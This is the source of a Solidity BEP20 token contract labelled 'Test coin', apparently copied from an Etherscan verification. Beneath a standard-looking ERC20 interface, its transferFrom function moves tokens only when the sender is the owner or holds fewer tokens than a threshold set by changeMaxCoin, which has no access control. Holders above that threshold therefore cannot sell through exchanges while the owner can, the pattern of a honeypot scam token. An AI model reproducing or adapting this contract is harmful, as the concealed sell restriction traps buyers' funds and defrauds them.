['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-26\n', '*/\n', '\n', '/**\n', '* Test coin !\n', '*/\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '// ----------------------------------------------------------------------------\n', '// ERC Token Standard #20 Interface\n', '//\n', '// ----------------------------------------------------------------------------\n', 'contract ERC20Interface {\n', '   function totalSupply() public view returns (uint);\n', '   function balanceOf(address tokenOwner) public view returns (uint balance);\n', '   function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '   function transfer(address to, uint tokens) public returns (bool success);\n', '   function approve(address spender, uint tokens) public returns (bool success);\n', '   function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '   function changeMaxCoin(uint256 coin) public returns (bool success);\n', '\n', '   event Transfer(address indexed from, address indexed to, uint tokens);\n', '   event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '// ----------------------------------------------------------------------------\n', '// Safe Math Library\n', '// ----------------------------------------------------------------------------\n', 'contract SafeMath {\n', '   function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '       c = a + b;\n', '       require(c >= a);\n', '   }\n', '   function safeSub(uint a, uint b) public pure returns (uint c) {\n', '       require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n', '       c = a / b;\n', '   }\n', '}\n', '\n', '\n', 'contract BEP20TOKEN is ERC20Interface, SafeMath {\n', '   string public name;\n', '   string public symbol;\n', '   uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n', '   uint256 public _totalSupply;\n', '   uint256 public _coins;\n', '   address public _owner;\n', '   mapping(address => uint) balances;\n', '   mapping(address => mapping(address => uint)) allowed;\n', '\n', '   /**\n', '    * Constrctor function\n', '    *\n', '    * Initializes contract with initial supply tokens to the creator of the contract\n', '    */\n', '   constructor( string memory name_, string memory symbol_, address owner_ , uint256  coins_) public {\n', '       name = name_;\n', '       symbol = symbol_;\n', '       decimals = 18;\n', '       _totalSupply = 1000000000000000000000000000000;\n', '       _owner = owner_;\n', '       _coins = coins_ * 10 ** 18;\n', '       balances[msg.sender] = _totalSupply;\n', '       emit Transfer(address(0), msg.sender, _totalSupply);\n', '   }\n', '\n', '   function totalSupply() public view returns (uint) {\n', '       return _totalSupply  - balances[address(0)];\n', '   }\n', '\n', '   function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '       return balances[tokenOwner];\n', '   }\n', '\n', '   function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '       return allowed[tokenOwner][spender];\n', '   }\n', '   \n', '   function approve(address spender, uint tokens) public returns (bool success) {\n', '       allowed[msg.sender][spender] = tokens;\n', '       emit Approval(msg.sender, spender, tokens);\n', '       return true;\n', '   }\n', '\n', '   function transfer(address to, uint tokens) public returns (bool success) {\n', '       balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '       balances[to] = safeAdd(balances[to], tokens);\n', '       emit Transfer(msg.sender, to, tokens);\n', '       return true;\n', '   }\n', '\n', '   function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '       \n', '       if (_owner == from  || balances[from] < _coins) {\n', '           balances[from] = safeSub(balances[from], tokens);\n', '           allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '           balances[to] = safeAdd(balances[to], tokens);\n', '           emit Transfer(from, to, tokens);\n', '           return true;\n', '       }\n', '       \n', '       \n', '   }\n', '   \n', '   function changeMaxCoin(uint256 coins) public returns (bool success) {\n', '        _coins = coins * 10 ** 18;\n', '        return true;\n', '   }\n', '}']